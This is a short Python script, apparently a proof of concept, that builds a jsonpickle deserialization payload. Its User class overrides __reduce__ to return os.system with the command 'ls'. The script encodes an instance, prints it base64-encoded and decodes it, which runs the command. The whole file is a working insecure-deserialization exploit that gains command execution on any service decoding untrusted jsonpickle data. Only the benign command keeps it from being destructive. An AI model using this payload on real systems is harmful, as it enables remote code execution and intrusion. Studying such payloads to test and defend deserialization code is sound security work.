import jsonpickle
import os
import subprocess
from base64 import b64decode,b64encode
class User(object):
    def __init__(self,username):
        self.username = username 

    def __reduce__(self):
        return (os.system, ('ls',))



admin = User('finsenty')


d=jsonpickle.encode(admin)

print(b64encode(d))



jsonpickle.decode(d)
